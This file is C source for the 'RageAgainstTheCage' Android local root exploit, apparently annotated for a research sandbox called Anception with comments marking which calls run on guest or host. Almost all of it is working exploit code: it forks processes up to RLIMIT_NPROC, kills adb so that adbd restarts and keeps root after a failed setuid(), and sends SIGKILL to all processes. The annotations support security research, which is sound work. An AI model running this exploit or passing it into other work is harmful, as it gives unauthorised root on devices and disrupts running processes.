/*
 * Reversed from rageagainstthecage-arm5.bin release by Sebastian Krahmer/743C
 * Local root exploit for Android
 * Anthony Lineberry
 *
 * This exploit will fork off proccesseses (as shell user) until the RLIMIT_NPROC max is
 * hit. At that point fork() will start failing. At this point the original parent
 * process will kill the adb process, causing it to restart. When adb starts, it
 * runs as root, and then drops its privs with setuid():
 *
 *  <snip>
 *   /* don't listen on a port (default 5037) if running in secure mode */
 *   /* don't run as root if we are running in secure mode */
 *   if (secure) {
 *
 *       ...
 *
 *       /* then switch user and group to "shell" */
 *       setgid(AID_SHELL);
 *       setuid(AID_SHELL);
 *  </snip>
 *
 * setuid() will decrement the root process count, and increment the shell user
 * proccess count. Since the shell user has hit the RLIMIT_NPROC max, this will
 * cause setuid() to fail. Since the adb code above doesn't check the retval of
 * setuid(), adb will still be running as root.
 *

 annotated for Anception by Earlence Fernandes
 this kills adb inside the guest but keeps forking
 on the host. Therefore, the host adb is not affected
 since it is never killed

 */
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
 
void die(char *s) {
  perror(s);
  exit(errno);
}
 
pid_t get_adb(void) {
  char path[256];
  pid_t pid = 0;
  int fd;
 
  while(pid < 32000) {
    sprintf(path, "/proc/%d/cmdline", pid);
    //open on guest because not a /proc/self access
    if(fd = open(path, O_RDONLY) < 0) {
      continue;
    }
    memset(path, 0, sizeof(path));

    //read on guest because fd was produced from guest
    read(fd, path, sizeof(path)-1);
    close(fd);
 
    if(strstr(path, "/sbin/adb") != 0) {
      return pid;
    }
 
    pid++;
  }
  return 0;
}
 
void kill_adb(pid_t pid) {
  while(1) {
    pid_t adb_pid = get_adb();
    if(adb_pid == pid || adb_pid == 0) {
      sleep(1);
      continue;
    }
    sleep(5);

    //kill on guest because the recipients are not determined
    kill(-1, SIGKILL);
  }
}
 
int main() {
  struct rlimit s_rlimit = {0};
  pid_t adb_pid;
  pid_t pid;
  pid_t pid2;
  char num_children = 0;
  int fd;
  int pfd[2];
 
  puts("[*] CVE-2010-EASY Android local root exploit (C) 743C");
  puts("[*] Checking NPROC limit ...");

  //exec on guest
  if(getrlimit(RLIMIT_NPROC, &s_rlimit) < 0) {
    die("[-] getrlimit");
  }
 
  if(s_rlimit.rlim_max == -1) {
    puts("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting");
    exit(1);
  }
 
  printf("[+] RLIMIT_NPROC={%lu, %lu}\n", s_rlimit.rlim_cur, s_rlimit.rlim_max);
  puts("[*] Searching for adb ...");
 
  if((adb_pid = get_adb()) == 0) {
    die("[-] Cannot find adb");
  }
 
  printf("[+] Found adb as PID %d\n", adb_pid);
 
  puts("[*] Spawning childing. Dont type anything and wait for reset!");
  // Donantion stuff goes here
  puts("[*]\n[*] adb connection will be reset. restart adb server on desktop.");
 
  sleep(5);
 
  // Fork processes, kill parent, and make sure child gets its own session ID
  //fork on host
  if(fork() > 0) {
    exit(0);
  }

  //setsid on guest
  setsid();
 
  //pipe fds created on guest
  pipe(pfd);
  pid = fork();
  if(pid != 0) { /* parent */
    // close write pipe
    close(pfd[1]);
 
    // blocks on pipe read until max proccesses have be forked
    // read on guest
    read(pfd[0], &num_children, 1);

    //redirected to guest because adb_pid is not in the exploits container
    //guest adb has been killed
    kill(adb_pid, SIGKILL);
    if(fork() != 0) {
      /* parent kills adb? */
      kill_adb(adb_pid);
    }
 
    fork();
    while(1) {
      sleep(0x743C);
    }
  } else {             /* child */
    // close read pipe
    close(pfd[0]);
 
    // fork till we can fork no more, exit children
    int write_to_pipe = 1;
    while(1) {
      // fork till we hit the RLIMIT_NOPROC max and fail
      if((pid2 = fork()) >= 0) {
        if(pid2 == 0) {
          exit(0);
        }
        num_children++;
      }
 
      // This will unblock the parents pipe read so that it can now kill adbd
      if(write_to_pipe) {
        printf("\n[+] Forked %d childs.\n", num_children);
	//write on guest
        write(pfd[1], &num_children, sizeof(num_children));

	//close on guest
        close(pfd[1]);
      }
      write_to_pipe = 0;
      // after this we just keep on forking again...
    }
  }
}
